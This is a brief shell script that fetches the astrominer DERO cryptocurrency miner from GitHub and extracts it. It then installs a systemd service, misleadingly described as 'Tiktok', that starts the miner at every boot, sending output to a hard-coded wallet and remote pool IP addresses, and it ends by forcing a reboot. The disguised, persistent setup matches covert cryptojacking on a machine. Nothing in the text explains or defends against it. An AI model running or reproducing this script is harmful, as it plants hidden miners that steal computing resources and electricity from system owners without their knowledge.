cd /home
sudo wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_modern_amd64_linux.tar.gz
sudo apt update
sudo tar xvzf astrominer-V1.9_modern_amd64_linux.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/astrominer -w dero1qy45fgfpwukunx354dqpsxc99uvr0aygt9fjylddf03vg55l7rf9gqg22ep58 -r 20.124.122.185:4444 -r1 20.124.122.185:5555 -r2 40.85.191.109:6666\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
sudo systemctl daemon-reload
sudo systemctl enable deroz.service
echo "Setup completed!"
sudo reboot
